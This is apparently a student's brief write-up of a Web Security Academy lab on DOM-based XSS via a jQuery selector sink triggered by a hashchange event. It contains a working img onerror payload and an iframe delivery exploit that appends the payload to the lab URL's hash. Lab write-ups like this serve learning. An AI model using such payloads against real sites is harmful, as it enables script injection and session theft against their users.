Lab: DOM XSS in jQuery selector sink using a hashchange event
XSS vuln on home page.
Task:deliver an exploit to the victim that calls the print() function
Analysis:
    /# in url - hashcnage event
    <img src=1 onerror=print()> -> executed pnly when event occur
    - first load the site, then load the hashchange event to execute the payload.
    <iframe src="https://0ad900b504910b1680bc3fa4004d0068.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>